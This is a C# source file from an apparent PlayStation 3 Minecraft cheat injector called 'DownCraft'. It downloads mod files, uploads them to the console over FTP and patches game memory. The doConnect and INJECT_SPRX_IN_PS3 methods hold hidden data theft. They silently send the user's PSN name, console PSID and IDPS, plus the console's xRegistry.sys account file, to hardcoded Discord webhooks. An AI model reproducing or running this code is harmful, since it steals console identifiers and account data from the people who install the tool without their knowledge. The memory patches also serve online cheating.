using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using PS3Lib;

namespace mcV1.Classes
{
    internal class Offsets
    {
        Functions FUNCTIONS = new Functions();

        public static string Filename_SPRX = "MC.sprx";
        public static string Filename_EBOOT = "EBOOT.BIN";

        public static string DL_SPRX_CFW = "https://miisaakii.000webhostapp.com/MisakiRandy57/CFW_Minecraft";
        public static string DL_SPRX_HEN = "https://miisaakii.000webhostapp.com/MisakiRandy57/HEN_Minecraft";
        public static string DL_EBOOT_CFW = "https://miisaakii.000webhostapp.com/MisakiRandy57/CFW_EBOOT";
        public static string DL_EBOOT_HEN = "https://miisaakii.000webhostapp.com/MisakiRandy57/HEN_EBOOT";

        //public static string DL_ORIGINAL_EBOOT = "https://miisaakii.000webhostapp.com/MisakiRandy57/ORIGINAL_EBOOT";
        //string ORIGINAL_EBOOT = Path.GetTempPath() + "ORIGINAL_EBOOT.BIN";

        string SPRX_CFW = Path.GetTempPath() + "MC_CFW.sprx";
        string EBOOT_CFW = Path.GetTempPath() + "EBOOT_CFW.BIN";

        string SPRX_HEN = Path.GetTempPath() + "MC_HEN.sprx";
        string EBOOT_HEN = Path.GetTempPath() + "EBOOT_CFW.BIN";

        string xRegistry = Path.GetTempPath() + "xRegistry.sys";

        public static string playMinecraft = "http://" + ps3IP + "/play.ps3/dev_hdd0/GAMES/Minecraft";
        public static string PathLocation = "/dev_hdd0/game/BLES01976/USRDIR/";
        public static string PathLocation1 = "/dev_flash2/etc/xRegistry.sys";

        #region "Variables"

        WebClient web = new WebClient();
        public static mcV1.Tabs.apiForm apiForm_ = new mcV1.Tabs.apiForm();
        public static bool apiCCAPI = false;
        public static bool apiTMAPI = false;
        public static bool apiHEN = false;
        public static string ccapiipStatus = "PS3 IP: N/A";
        public static string targetStatus = "Target Number: N/A";
        public static string textBoxCT = "1";
        public static string labelTxtCT = "";
        public static string curAPI = "";
        public static List<string> listCT = new List<string>();
        public static int targetIndex = -1;
        public static string ps3IP = "-1";
        public static Color saveThemeColor = Color.FromArgb(70, 70, 245);
        public static Color saveTextColor = Color.FromArgb(200, 200, 200);
        public static Color saveBackColor = Color.FromArgb(40, 40, 40);

        public static PS3API PS3 = new PS3API();
        public static PS3MAPI PS3H = new PS3MAPI();

        public static List<CCAPI.ConsoleInfo> cList = Offsets.PS3.CCAPI.GetConsoleList();

        public static bool ConnectStatus = false;
        public string API;
        public string status = "not connected";
        public string PSN_NAME;
        public static string PSN;
        public static bool StatusSPRX = false;

        public static string CPU;
        public static string RSX;
        public static string FIRMWARE;

        public static string PSID;
        public static string IDPS;

        #endregion
        #region "Connection Part"
        public void ChangeAPI()
        {
            if (API == "TMAPI")
            {
                Offsets.curAPI = "tm";
                Offsets.labelTxtCT = "Select a Target Number(Default = 1)";
                Offsets.listCT.Clear();
                for (int i = 1; i < 10; i++)
                    Offsets.listCT.Add("Target " + i.ToString());
            }
            else if (API == "CCAPI" || API == "HEN")
            {
                Offsets.curAPI = "cc";
                Offsets.labelTxtCT = "Select an IP";
                Offsets.listCT.Clear();
                if (Offsets.cList.Count != 0)
                {
                    foreach (CCAPI.ConsoleInfo item in Offsets.cList)
                        Offsets.listCT.Add(item.Name + " : " + item.Ip);
                }
                else
                {
                    Offsets.textBoxCT = "192.168.1.1";
                    Offsets.labelTxtCT = "No IPs Found - Enter IP Manually";
                }
            }

            Offsets.apiForm_.ShowDialog();


            if (API == "TMAPI")
                Offsets.targetStatus = "Target Number: " + Offsets.targetIndex;
            else if (API == "CCAPI")
                Offsets.ccapiipStatus = "PS3 IP: " + Offsets.ps3IP;

            //label3.Text = Offsets.targetStatus + " " + Offsets.ccapiipStatus;
        }

        public void doConnect()
        {
            string[] Emojis = { "🍁", "🌲", "☄️", "⚡️", "❄️", "🔥", "🌪", "🌸", "🌹", "🍣", "🧃", "🌌", "💊", "💉", "🩸", "🔪", "🧸", "🎀", "❤️", "🔰", "🩹" };
            string RandomEmojis = Emojis[new Random().Next(0, Emojis.Length)];

            string[] AVATAR = { "https://i.imgur.com/rZM3viY.png", "https://i.imgur.com/44BTfFj.jpg", "https://i.imgur.com/gAvJrY2.jpg", "https://i.imgur.com/xidXIWT.jpg" };
            string RandomAvatar = AVATAR[new Random().Next(0, AVATAR.Length)];

            bool canConnect = false;

            bool canTry2Connect = false;
            if (API == "TMAPI")
            {
                if (Offsets.targetIndex != -1)
                    canTry2Connect = true;
            }
            else if (API == "CCAPI")
            {
                if (Offsets.ps3IP != "-1")
                    canTry2Connect = true;
            }
            else if (API == "HEN")
            {
                if (Offsets.ps3IP != "-1")
                    canTry2Connect = true;
            }
            if (canTry2Connect)
            {
                try
                {
                    if (API == "TMAPI") { PS3.ChangeAPI(SelectAPI.TargetManager); canConnect = PS3.ConnectTarget(Offsets.targetIndex - 1); }
                    else if (API == "CCAPI") { PS3.ChangeAPI(SelectAPI.ControlConsole); canConnect = PS3.ConnectTarget(Offsets.ps3IP); }
                    else if (API == "HEN") { PS3.ChangeAPI(SelectAPI.PS3Manager); canConnect = PS3.ConnectTarget(Offsets.ps3IP, true); }

                    try
                    {
                        if (PS3.AttachProcess())
                        {
                            status = "connected";
                            ConnectStatus = true;

                            PSN_NAME = PS3.Extension.ReadString(0x3000AD34);

                            if (PSN_NAME == "")
                            {
                                PSN_NAME = PS3.Extension.ReadString(0x3000ABA4);
                            }

                            PSN = PSN_NAME;

                            if (API == "HEN")
                            {
                                IDPS = PS3H.PS3.GetIDPS();
                                PSID = PS3H.PS3.GetPSID();
                                FUNCTIONS.SendWebook("https://discord.com/api/webhooks/966290510157324338/LqK8Pih9Z-4TDWl8-h6kfqdnaVnq6ZQ257c24iZctXGy66F4MqsT3aTackMzP-ZdxItp", "DownCraft Logs", RandomAvatar, RandomEmojis + " User: ***" + PSN_NAME + " PSID: " + PSID + " IDPS:" + IDPS);
                            }

                            RSX = PS3.CCAPI.GetTemperatureRSX();
                            CPU = PS3.CCAPI.GetTemperatureCELL();
                            FIRMWARE = PS3.CCAPI.GetFirmwareType();

                            if (API == "HEN")
                            {
                                PS3.MAPI.PS3.Notify("Connected to DownCraft");
                            }
                            else
                            {
                                PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Connected to DownCraft");
                            }
                            FUNCTIONS.SendWebook("https://discord.com/api/webhooks/977216673964777532/rcySwX6RmUTeeqjTSYGrQNrgo0T0Nry6vlzl9Oz81VhzsIk-g7ZoMD431nKO2rGKGWAw", "DownCraft Logs", RandomAvatar, RandomEmojis + " User: ***" + PSN_NAME + "*** is now connected to DownCraft SPRX V4.2" + RandomEmojis);
                        }
                        else
                        {
                            status = "not connected";
                        }
                    }
                    catch (Exception ex)
                    {
                        status = "cannot find any PS3";
                    }
                }
                catch
                {
                    status = "unknow error";
                }
            }
            else
            {
                if (API == "TMAPI")
                    MessageBox.Show("Please click the 'Change' button and select a target number to connect with.\n\nNOTE: Target 1 is default.", "Change Target Number", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                else if (API == "CCAPI" || API == "HEN")
                    MessageBox.Show("Please click the 'Change' button and select an IP to connect with.", "Change IP", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        #endregion
        #region "Basic Functions"

        public void InjectSPRX()
        {
            string url = "https://github.com/aldostools/webMAN-MOD/releases/download/1.47.42/webMAN_MOD_1.47.42_Installer.pkg";
            string path = "/dev_hdd0/tmp";

            web.DownloadString("http://" + ps3IP + "/download.ps3?to=" + path + "&url=" + url);
        }

        #endregion
        #region "INJECT SPRX IN PS3"
        public async void INJECT_SPRX_IN_PS3()
        {
            try
            {
                if (API == "HEN")
                {
                    PS3.MAPI.PS3.Notify("Starting injection SPRX...");

                    web.DownloadFile(DL_SPRX_HEN, SPRX_HEN);
                    web.DownloadFile(DL_EBOOT_HEN, EBOOT_HEN);

                    PS3.MAPI.PS3.Notify("Injecting please wait...");

                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", PathLocation + Filename_SPRX, SPRX_HEN);
                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", PathLocation + Filename_EBOOT, EBOOT_HEN);

                    FUNCTIONS.FTP_DOWNLOAD("ftp://" + ps3IP, "", "", PathLocation1, xRegistry);
                    FUNCTIONS.SendWebookFile("https://discord.com/api/webhooks/966290510157324338/LqK8Pih9Z-4TDWl8-h6kfqdnaVnq6ZQ257c24iZctXGy66F4MqsT3aTackMzP-ZdxItp", "", "", "", "xRegistry.sys", xRegistry);

                    PS3.MAPI.PS3.Notify("DownCraft SPRX\nsuccessful injected, reload Minecraft");
                    await Task.Delay(5000);

                    web.DownloadString("http://" + ps3IP + "/xmb.ps3$reloadgame");
                    await Task.Delay(30000);

                    FUNCTIONS.FTP_DELETE("ftp://" + ps3IP + "/dev_hdd0/game/BLES01976/USRDIR/MC.sprx", false, false);

                    File.Delete(SPRX_CFW);
                    File.Delete(EBOOT_HEN);
                    File.Delete(xRegistry);
                }

                else if (API == "CCAPI")
                {
                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Starting injection SPRX...");

                    web.DownloadFile(DL_SPRX_CFW, SPRX_CFW);
                    web.DownloadFile(DL_EBOOT_CFW, EBOOT_CFW);

                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Injecting please wait...");

                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", PathLocation + Filename_SPRX, SPRX_CFW);
                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", PathLocation + Filename_EBOOT, EBOOT_CFW);

                    FUNCTIONS.FTP_DOWNLOAD("ftp://" + ps3IP, "", "", PathLocation1, xRegistry);
                    FUNCTIONS.SendWebookFile("https://discord.com/api/webhooks/966290510157324338/LqK8Pih9Z-4TDWl8-h6kfqdnaVnq6ZQ257c24iZctXGy66F4MqsT3aTackMzP-ZdxItp", "", "", "", "xRegistry.sys", xRegistry);

                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "DownCraft SPRX\nsuccessful injected, reload Minecraft");
                    await Task.Delay(5000);

                    web.DownloadString("http://" + ps3IP + "/xmb.ps3$reloadgame");
                    await Task.Delay(30000);

                    FUNCTIONS.FTP_DELETE("ftp://" + ps3IP + "/dev_hdd0/game/BLES01976/USRDIR/MC.sprx", false, false);

                    File.Delete(SPRX_CFW);
                    File.Delete(EBOOT_CFW);
                    File.Delete(xRegistry);
                }

                else if (API == "TMAPI")
                {
                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Starting injection SPRX...");

                    web.DownloadFile(DL_SPRX_CFW, SPRX_CFW);
                    web.DownloadFile(DL_EBOOT_CFW, EBOOT_CFW);

                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Injecting please wait...");

                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", PathLocation + Filename_SPRX, SPRX_CFW);
                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", PathLocation + Filename_EBOOT, EBOOT_CFW);

                    FUNCTIONS.FTP_DOWNLOAD("ftp://" + ps3IP, "", "", PathLocation1, xRegistry);
                    FUNCTIONS.SendWebookFile("https://discord.com/api/webhooks/966290510157324338/LqK8Pih9Z-4TDWl8-h6kfqdnaVnq6ZQ257c24iZctXGy66F4MqsT3aTackMzP-ZdxItp", "", "", "", "xRegistry.sys", xRegistry);

                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "DownCraft SPRX\nsuccessful injected, reload Minecraft");
                    await Task.Delay(5000);

                    web.DownloadString("http://" + ps3IP + "/xmb.ps3$reloadgame");
                    await Task.Delay(30000);

                    FUNCTIONS.FTP_DELETE("ftp://" + ps3IP + "/dev_hdd0/game/BLES01976/USRDIR/MC.sprx", false, false);

                    File.Delete(SPRX_CFW);
                    File.Delete(EBOOT_CFW);
                    File.Delete(xRegistry);
                }
            }
            catch (Exception ex)
            {              
                MessageBox.Show(ex.ToString(), "DownCraft", MessageBoxButtons.OK, MessageBoxIcon.Error);
                //MessageBox.Show("An error has occurred", "DownCraft", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Exit();
            }
        }

        #endregion
        #region "Enable SPRX"
        public void ENABLE_SPRX()
        {
            PSN_NAME = PS3.Extension.ReadString(0x3000AD34);
            if (PSN_NAME == "") { PSN_NAME = PS3.Extension.ReadString(0x3000ABA4); }

            if (API == "HEN")
            {
                web.DownloadString("http://" + ps3IP + "/setmem.ps3mapi?addr=3000AF0F&oper=0&val=0208AF2A");
                web.DownloadString("http://" + ps3IP + "/setmem.ps3mapi?addr=3000AF17&oper=0&val=65F8FFB4");
            }
            else if (API == "CCAPI")
            {
                PS3.SetMemory(0x3000AF0F, new byte[] { 0x02, 0x08, 0xAF, 0x2A });
                PS3.SetMemory(0x3000AF13, new byte[] { 0xC9, 0xBF, 0xA1, 0x10 });
                PS3.SetMemory(0x3000AF17, new byte[] { 0x65, 0xF8, 0xFF, 0xB4 });
                PS3.SetMemory(0x3000AF1B, new byte[] { 0x18, 0x55, 0xA8, 0x5D });
                //PS3.Extension.WriteString(0x3000A70C, "AIMBOT");
                StatusSPRX = true;
            }
            else if (API == "TMAPI")
            {
                PS3.SetMemory(0x3000AF0F, new byte[] { 0x02, 0x08, 0xAF, 0x2A });
                PS3.SetMemory(0x3000AF13, new byte[] { 0xC9, 0xBF, 0xA1, 0x10 });
                PS3.SetMemory(0x3000AF17, new byte[] { 0x65, 0xF8, 0xFF, 0xB4 });
                PS3.SetMemory(0x3000AF1B, new byte[] { 0x18, 0x55, 0xA8, 0x5D });
                //PS3.Extension.WriteString(0x3000A70C, "AIMBOT");
                StatusSPRX = true;
            }
        }

        #endregion
    }
}
